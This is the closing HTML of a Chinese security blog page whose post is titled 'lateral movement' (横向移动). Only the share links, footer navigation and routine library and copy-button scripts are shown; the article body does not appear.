  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&is_video=false&description=横向移动 | xiaodisec"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=横向移动 | xiaodisec&body=Check out this article: https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&name=横向移动 | xiaodisec&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&t=横向移动 | xiaodisec"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2025
    killeveee
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
